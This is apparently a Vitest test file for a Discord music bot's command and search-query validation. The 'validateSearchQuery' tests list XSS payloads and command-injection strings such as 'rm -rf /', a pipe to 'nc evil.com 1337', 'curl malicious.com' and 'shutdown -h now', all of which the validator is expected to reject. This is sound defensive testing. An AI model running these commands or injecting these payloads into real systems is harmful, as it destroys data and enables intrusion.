import { describe, it, expect } from 'vitest';
import { validateCommandMessage, validateSearchQuery } from '../src/validation.js';

describe('Audio Command Validation', () => {
  describe('validateCommandMessage', () => {
    it('should validate play command with all required fields', () => {
      const command = {
        type: 'play',
        guildId: '123456789012345678',
        voiceChannelId: '987654321098765432',
        textChannelId: '111222333444555666',
        userId: '777888999000111222',
        query: 'Taylor Swift - Anti-Hero',
        requestId: 'req_123'
      };

      const result = validateCommandMessage(command);
      
      expect(result.success).toBe(true);
      expect(result.data).toEqual(command);
    });

    it('should validate play command without optional requestId', () => {
      const command = {
        type: 'play',
        guildId: '123456789012345678',
        voiceChannelId: '987654321098765432', 
        textChannelId: '111222333444555666',
        userId: '777888999000111222',
        query: 'Some music query'
      };

      const result = validateCommandMessage(command);
      expect(result.success).toBe(true);
    });

    it('should reject play command with invalid snowflake IDs', () => {
      const command = {
        type: 'play',
        guildId: 'invalid_id',
        voiceChannelId: '987654321098765432',
        textChannelId: '111222333444555666',
        userId: '777888999000111222',
        query: 'test query'
      };

      const result = validateCommandMessage(command);
      expect(result.success).toBe(false);
      expect(result.error).toContain('Guild ID');
    });

    it('should reject play command with malicious query', () => {
      const command = {
        type: 'play',
        guildId: '123456789012345678',
        voiceChannelId: '987654321098765432',
        textChannelId: '111222333444555666', 
        userId: '777888999000111222',
        query: '<script>alert("xss")</script>'
      };

      const result = validateCommandMessage(command);
      expect(result.success).toBe(false);
      expect(result.error).toContain('potentially malicious content');
    });

    it('should validate simple commands without extra fields', () => {
      const commands = [
        { type: 'skip', guildId: '123456789012345678' },
        { type: 'pause', guildId: '123456789012345678' },
        { type: 'resume', guildId: '123456789012345678' },
        { type: 'toggle', guildId: '123456789012345678' },
        { type: 'stop', guildId: '123456789012345678' },
        { type: 'shuffle', guildId: '123456789012345678' },
        { type: 'clear', guildId: '123456789012345678' },
        { type: 'seedRelated', guildId: '123456789012345678' }
      ];

      for (const command of commands) {
        const result = validateCommandMessage(command);
        expect(result.success).toBe(true);
        expect(result.data).toEqual(command);
      }
    });

    it('should validate volume command with valid percentage', () => {
      const command = {
        type: 'volume',
        guildId: '123456789012345678',
        percent: 75
      };

      const result = validateCommandMessage(command);
      expect(result.success).toBe(true);
    });

    it('should reject volume command with invalid percentage', () => {
      const invalidVolumes = [-10, 250, 3.14, NaN, Infinity];

      for (const percent of invalidVolumes) {
        const command = {
          type: 'volume',
          guildId: '123456789012345678',
          percent
        };

        const result = validateCommandMessage(command);
        expect(result.success).toBe(false);
        expect(result.error).toContain('percent');
      }
    });

    it('should validate loop mode command', () => {
      const validModes = ['off', 'track', 'queue'];

      for (const mode of validModes) {
        const command = {
          type: 'loopSet',
          guildId: '123456789012345678',
          mode
        };

        const result = validateCommandMessage(command);
        expect(result.success).toBe(true);
      }
    });

    it('should reject invalid loop modes', () => {
      const command = {
        type: 'loopSet',
        guildId: '123456789012345678',
        mode: 'invalid_mode'
      };

      const result = validateCommandMessage(command);
      expect(result.success).toBe(false);
      expect(result.error).toContain('Invalid loop mode');
    });

    it('should validate volume adjust command', () => {
      const command = {
        type: 'volumeAdjust',
        guildId: '123456789012345678',
        delta: -10
      };

      const result = validateCommandMessage(command);
      expect(result.success).toBe(true);
    });

    it('should validate seek commands', () => {
      const seekCommand = {
        type: 'seek',
        guildId: '123456789012345678',
        positionMs: 30000
      };

      const seekAdjustCommand = {
        type: 'seekAdjust', 
        guildId: '123456789012345678',
        deltaMs: -5000
      };

      expect(validateCommandMessage(seekCommand).success).toBe(true);
      expect(validateCommandMessage(seekAdjustCommand).success).toBe(true);
    });

    it('should validate commands with requestId', () => {
      const commands = [
        {
          type: 'nowplaying',
          guildId: '123456789012345678',
          requestId: 'req_nowplaying_123'
        },
        {
          type: 'queue',
          guildId: '123456789012345678', 
          requestId: 'req_queue_456'
        }
      ];

      for (const command of commands) {
        const result = validateCommandMessage(command);
        expect(result.success).toBe(true);
        expect(result.data).toEqual(command);
      }
    });

    it('should reject nowplaying/queue commands without requestId', () => {
      const commands = [
        {
          type: 'nowplaying',
          guildId: '123456789012345678'
        },
        {
          type: 'queue',
          guildId: '123456789012345678'
        }
      ];

      for (const command of commands) {
        const result = validateCommandMessage(command);
        expect(result.success).toBe(false);
        expect(result.error).toContain('Request ID is required');
      }
    });

    it('should validate remove and move commands', () => {
      const removeCommand = {
        type: 'remove',
        guildId: '123456789012345678',
        index: 3
      };

      const moveCommand = {
        type: 'move',
        guildId: '123456789012345678',
        from: 2,
        to: 5
      };

      expect(validateCommandMessage(removeCommand).success).toBe(true);
      expect(validateCommandMessage(moveCommand).success).toBe(true);
    });

    it('should reject commands with missing required fields', () => {
      const invalidCommands = [
        { type: 'play' }, // missing all required fields
        { type: 'play', guildId: '123456789012345678' }, // missing other required fields
        { type: 'volume', guildId: '123456789012345678' }, // missing percent
        { type: 'seek' }, // missing guildId and positionMs
        { type: 'remove', guildId: '123456789012345678' }, // missing index
        { type: 'move', guildId: '123456789012345678', from: 1 } // missing to
      ];

      for (const command of invalidCommands) {
        const result = validateCommandMessage(command);
        expect(result.success).toBe(false);
      }
    });

    it('should reject completely invalid command structures', () => {
      const invalidInputs = [
        null,
        undefined,
        'string',
        123,
        [],
        { not_a_type: 'invalid' },
        { type: 'unknown_command', guildId: '123456789012345678' }
      ];

      for (const input of invalidInputs) {
        const result = validateCommandMessage(input as unknown);
        if (result.success) {
          console.log('Unexpected success for input:', input);
        }
        expect(result.success).toBe(false);
      }
    });

    it('should handle edge cases in query validation', () => {
      const edgeCases = [
        '',
        ' '.repeat(10),
        'a'.repeat(1001), // too long
        'Normal song title with émojis 🎵 and ñ characters',
        'https://open.spotify.com/track/4iV5W9uYEdYUVa79Axb7Rh',
        'Artist - Song (feat. Other Artist) [Official Video]'
      ];

      for (const query of edgeCases) {
        const command = {
          type: 'play',
          guildId: '123456789012345678',
          voiceChannelId: '987654321098765432',
          textChannelId: '111222333444555666',
          userId: '777888999000111222',
          query
        };

        const result = validateCommandMessage(command);
        
        if (query === '' || query.trim() === '' || query.length > 1000) {
          expect(result.success).toBe(false);
        } else {
          expect(result.success).toBe(true);
        }
      }
    });

    it('should preserve valid data after sanitization', () => {
      const command = {
        type: 'play',
        guildId: '123456789012345678',
        voiceChannelId: '987654321098765432',
        textChannelId: '111222333444555666', 
        userId: '777888999000111222',
        query: 'Song Title with "quotes" and \'apostrophes\' <div>removed</div>'
      };

      const result = validateCommandMessage(command);
      
      expect(result.success).toBe(true);
      expect(result.data?.query).not.toContain('<div>');
      expect(result.data?.query).not.toContain('</div>');
      expect(result.data?.query).toContain('Song Title');
      expect(result.data?.query).toContain('"quotes"');
      expect(result.data?.query).toContain("'apostrophes'");
    });
  });

  describe('validateSearchQuery', () => {
    it('should validate normal search queries', () => {
      const validQueries = [
        'Taylor Swift - Anti-Hero',
        'The Beatles - Yesterday',
        'Mozart Symphony No. 40',
        'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
        'Beethoven 9th Symphony',
        'Song with émojis 🎵 and ñ characters',
        'Artist feat. Other Artist',
        'Song (Official Video) [HD]',
        'Nightcore - Song Name',
        '2023 Hit Songs Playlist'
      ];

      for (const query of validQueries) {
        const result = validateSearchQuery(query);
        expect(result.success).toBe(true);
        expect(result.data).toBeDefined();
        expect(result.data?.length).toBeGreaterThan(0);
      }
    });

    it('should reject empty or whitespace-only queries', () => {
      const emptyQueries = [
        '',
        '   ',
        '\t\n\r   ',
        '\u00A0', // non-breaking space
      ];

      for (const query of emptyQueries) {
        const result = validateSearchQuery(query);
        expect(result.success).toBe(false);
        expect(result.error).toMatch(/empty/i);
      }
    });

    it('should reject queries that are too long', () => {
      const longQuery = 'a'.repeat(1001);
      const result = validateSearchQuery(longQuery);
      expect(result.success).toBe(false);
      expect(result.error).toMatch(/too long/i);
    });

    it('should detect and reject XSS attempts', () => {
      const xssAttempts = [
        '<script>alert("xss")</script>',
        '<script src="malicious.js"></script>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<object data="javascript:alert(1)"></object>',
        '<embed src="javascript:alert(1)">',
        'javascript:alert(1)',
        'vbscript:msgbox(1)',
        'data:text/html,<script>alert(1)</script>',
        'onload=alert(1)',
        'onclick=alert(1)',
        'onerror=alert(1)'
      ];

      for (const query of xssAttempts) {
        const result = validateSearchQuery(query);
        expect(result.success).toBe(false);
        expect(result.error).toMatch(/malicious content/i);
      }
    });

    it('should detect and reject obvious command injection attempts', () => {
      const injectionAttempts = [
        'song; rm -rf /',
        'song | nc evil.com 1337',
        'song | curl malicious.com',
        '; shutdown -h now',
        '| bash -c "evil"'
      ];

      for (const query of injectionAttempts) {
        const result = validateSearchQuery(query);
        expect(result.success).toBe(false);
        expect(result.error).toMatch(/malicious content/i);
      }
    });

    it('should allow harmless characters that might look suspicious', () => {
      const acceptableQueries = [
        'song && artist', // && in music context
        'song; artist', // ; as separator in music
        'song | artist', // | as separator in music
        'song (feat. artist)',
        'song [official video]',
        'song {remastered}',
        'song $uicideboy$', // artist name
        "song 'acoustic version'",
        'song eval(uation)',
        'song with exec(utive) producer'
      ];

      for (const query of acceptableQueries) {
        const result = validateSearchQuery(query);
        expect(result.success).toBe(true);
      }
    });

    it('should allow common SQL-like terms in music context', () => {
      const musicQueriesWithSQLTerms = [
        "song UNION band",
        'song DROP artist',
        "song DELETE record",
        'song OR artist',
        'song INSERT coin',
        'song SELECT edition'
      ];

      for (const query of musicQueriesWithSQLTerms) {
        const result = validateSearchQuery(query);
        expect(result.success).toBe(true); // Should be allowed in music context
      }
    });

    it('should allow normal file paths and URLs but reject dangerous protocols', () => {
      const acceptableUrls = [
        'https://youtube.com/watch?v=abc123',
        'https://open.spotify.com/track/123',
        'song/artist/album',
        '../previous album',
        '~/home/music/song.mp3'
      ];

      for (const query of acceptableUrls) {
        const result = validateSearchQuery(query);
        expect(result.success).toBe(true);
      }
    });

    it('should properly sanitize queries with HTML tags', () => {
      const result = validateSearchQuery('Song with <script>alert("test")</script> tags');
      
      expect(result.success).toBe(false); // Should be rejected due to script tag
    });

    it('should preserve most punctuation in music context', () => {
      const result = validateSearchQuery('Song with & "quotes" and \'apostrophes\' {braces}');
      
      expect(result.success).toBe(true);
      expect(result.data).toContain('Song with');
      // These characters should be preserved for music searches
      expect(result.data).toContain('&');
      expect(result.data).toContain('"');
      expect(result.data).toContain("'");
      expect(result.data).toContain('{');
      expect(result.data).toContain('}');
    });

    it('should remove control characters and normalize whitespace', () => {
      // Use control chars that aren't null bytes (which are correctly rejected as malicious)
      const queryWithControlChars = 'Song\x08With\x0BControl\x0CChars   and   extra   spaces';
      const result = validateSearchQuery(queryWithControlChars);
      
      expect(result.success).toBe(true);
      expect(result.data).toBe('SongWithControlChars and extra spaces');
      // Check that control characters were removed without using them in regex
      expect(result.data).not.toContain('\x08');
      expect(result.data).not.toContain('\x0B');
      expect(result.data).not.toContain('\x0C');
      expect(result.data).not.toMatch(/\s{2,}/);
    });

    it('should handle edge cases with special Unicode characters', () => {
      const unicodeQuery = 'Song with émojis 🎵🎶 and other unicode ñáéíóú';
      const result = validateSearchQuery(unicodeQuery);
      
      expect(result.success).toBe(true);
      expect(result.data).toContain('émojis');
      expect(result.data).toContain('🎵🎶');
      expect(result.data).toContain('ñáéíóú');
    });

    it('should reject queries that become empty after sanitization', () => {
      const queriesThatBecomeEmpty = [
        '<script></script>',
        '\x00\x01\x02'  // only control characters
      ];

      for (const query of queriesThatBecomeEmpty) {
        const result = validateSearchQuery(query);
        expect(result.success).toBe(false);
        // Should be rejected either as malicious or empty after sanitization
        expect(result.error).toMatch(/(malicious content|empty after sanitization)/i);
      }
    });

    it('should enforce length limit after sanitization', () => {
      // Create a string that when sanitized might still be too long
      const longQueryWithHtml = '<div>' + 'a'.repeat(1500) + '</div>';
      const result = validateSearchQuery(longQueryWithHtml);
      
      if (result.success) {
        expect(result.data?.length).toBeLessThanOrEqual(1000);
      }
    });

    it('should handle non-string inputs gracefully', () => {
      const invalidInputs = [
        null,
        undefined,
        123,
        [],
        {},
        true,
        false
      ];

      for (const input of invalidInputs) {
        const result = validateSearchQuery(input as unknown as string);
        expect(result.success).toBe(false);
        expect(result.error).toMatch(/non-empty string/i);
      }
    });
  });
});